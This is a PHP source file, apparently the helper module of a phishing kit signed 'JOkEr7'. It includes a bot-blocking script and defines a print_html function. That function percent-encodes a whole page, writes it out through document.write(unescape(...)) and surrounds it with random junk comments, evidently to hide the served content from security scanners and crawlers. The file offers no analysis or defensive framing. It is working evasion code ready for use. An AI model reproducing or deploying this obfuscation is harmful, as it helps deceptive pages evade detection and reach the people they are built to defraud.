<?php
                  ###
                ####
                ###
        #######    #######
      ######################
     #####################
     ####################
     #####################
      ######################
       ####################
         ################
          #### [v1] ####

/*----------------[ J7-@live.com ]--| JOkEr7 |--[ 2019 ]----------------*/
$key = rand(00000000000, 99999999999).time();
#----------------------++
include 'lang/en.php';
include '../BlockBot.php';
#---------------------------------------------------------++
if(isMobileDevice()){ $meta = '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">'; }
#---------------------------------------------------------++
function fetch_value($str,$find_start,$find_end)
{
	$start = @strpos($str,$find_start);
	if ($start === false) {
	return "";
	}
	$length = strlen($find_start);
	$end    = strpos(substr($str,$start +$length),$find_end);
	return trim(substr($str,$start +$length,$end));
}
#---------------------------------------------------------++
function gen_rand($len){

    $a = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
    $i = 0;
    $str = "";
    for($i = 0; $i < $len; ++$i) {
    $str .= $a[rand(0, sizeof($a) - 1)];
    }
    return $str;
}
#---------------------------------------------------------++
function isMobileDevice(){
    $aMobileUA = array('/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' => 'iPad','/android/i' => 'Android','/blackberry/i' => 'BlackBerry','/webos/i' => 'Mobile','/Opera Mini/i' => 'Opera');
    foreach($aMobileUA as $sMobileKey => $sMobileOS){
        if(preg_match($sMobileKey, $_SERVER['HTTP_USER_AGENT'])){
            return true;
        }
    }
    return false;
}
#---------------------------------------------------------++
function url_encode_full($Code) {

$replacing=$Code;
$replacing = str_replace('3' , '%33' ,$replacing);
$replacing = str_replace('0' , '%30' ,$replacing);
$replacing = str_replace('1' , '%31' ,$replacing);
$replacing = str_replace('2' , '%32' ,$replacing);
$replacing = str_replace('4' , '%34' ,$replacing);
$replacing = str_replace('5' , '%35' ,$replacing);
$replacing = str_replace('6' , '%36' ,$replacing);
$replacing = str_replace('7' , '%37' ,$replacing);
$replacing = str_replace('8' , '%38' ,$replacing);
$replacing = str_replace('9' , '%39' ,$replacing);
$replacing = str_replace('A' , '%41' ,$replacing);
$replacing = str_replace('B' , '%42' ,$replacing);
$replacing = str_replace('C' , '%43' ,$replacing);
$replacing = str_replace('D' , '%44' ,$replacing);
$replacing = str_replace('E' , '%45' ,$replacing);
$replacing = str_replace('F' , '%46' ,$replacing);
$replacing = str_replace('G' , '%47' ,$replacing);
$replacing = str_replace('H' , '%48' ,$replacing);
$replacing = str_replace('I' , '%49' ,$replacing);
$replacing = str_replace('J' , '%4A' ,$replacing);
$replacing = str_replace('K' , '%4B' ,$replacing);
$replacing = str_replace('L' , '%4C' ,$replacing);
$replacing = str_replace('M' , '%4D' ,$replacing);
$replacing = str_replace('N' , '%4E' ,$replacing);
$replacing = str_replace('O' , '%4F' ,$replacing);
$replacing = str_replace('P' , '%50' ,$replacing);
$replacing = str_replace('Q' , '%51' ,$replacing);
$replacing = str_replace('R' , '%52' ,$replacing);
$replacing = str_replace('S' , '%53' ,$replacing);
$replacing = str_replace('T' , '%54' ,$replacing);
$replacing = str_replace('U' , '%55' ,$replacing);
$replacing = str_replace('V' , '%56' ,$replacing);
$replacing = str_replace('W' , '%57' ,$replacing);
$replacing = str_replace('X' , '%58' ,$replacing);
$replacing = str_replace('Y' , '%59' ,$replacing);
$replacing = str_replace('Z' , '%5A' ,$replacing);
$replacing = str_replace('a' , '%61' ,$replacing);
$replacing = str_replace('b' , '%62' ,$replacing);
$replacing = str_replace('c' , '%63' ,$replacing);
$replacing = str_replace('d' , '%64' ,$replacing);
$replacing = str_replace('e' , '%65' ,$replacing);
$replacing = str_replace('f' , '%66' ,$replacing);
$replacing = str_replace('g' , '%67' ,$replacing);
$replacing = str_replace('h' , '%68' ,$replacing);
$replacing = str_replace('i' , '%69' ,$replacing);
$replacing = str_replace('j' , '%6A' ,$replacing);
$replacing = str_replace('k' , '%6B' ,$replacing);
$replacing = str_replace('l' , '%6C' ,$replacing);
$replacing = str_replace('m' , '%6D' ,$replacing);
$replacing = str_replace('n' , '%6E' ,$replacing);
$replacing = str_replace('o' , '%6F' ,$replacing);
$replacing = str_replace('p' , '%70' ,$replacing);
$replacing = str_replace('q' , '%71' ,$replacing);
$replacing = str_replace('r' , '%72' ,$replacing);
$replacing = str_replace('s' , '%73' ,$replacing);
$replacing = str_replace('t' , '%74' ,$replacing);
$replacing = str_replace('u' , '%75' ,$replacing);
$replacing = str_replace('v' , '%76' ,$replacing);
$replacing = str_replace('w' , '%77' ,$replacing);
$replacing = str_replace('x' , '%78' ,$replacing);
$replacing = str_replace('y' , '%79' ,$replacing);
$replacing = str_replace('z' , '%7A' ,$replacing);
$replacing = str_replace('"' , '\"' ,$replacing);
$replacing = str_replace("\r\n" , '\n' ,$replacing);
$replacing = str_replace("\n" , '\n' ,$replacing);
return $replacing;
}
#---------------------------------------------------------++
function print_html($Code) {
print "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">
<html lang=\"en\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">";
#---------++
$Code_hml = "<!-- ".gen_rand(rand(600,850))." -->";
$Code_php = "  /* ".gen_rand(rand(500,750))." */ ";
$Start_Sc =  '<script language="JavaScript">';
$Document = 'document.write(unescape("'.url_encode_full($Code).'"));';
$End___Sc = '</script>';
#---------++
print  $Code_hml;
print "\n";
print "<!--- -- -- -- -- -- -- -- -- -- -- -- --( J7 )-- -- -- -- -- -- -- -- -- -- -- -- --->";
print "\n";
print $Code_hml.$Start_Sc;
print "\n";
print $Code_php.$Document;
print "\n";
print $Code_php.$End___Sc;
print "\n";
print "<!-- -- -- -- -- -- -- -- -- -- --[ By JOkEr7 - 2019 ]-- -- -- -- -- -- -- -- -- -- -->";
print "\n";
print  $Code_hml;
}
#---------------------------------------------------------++

?>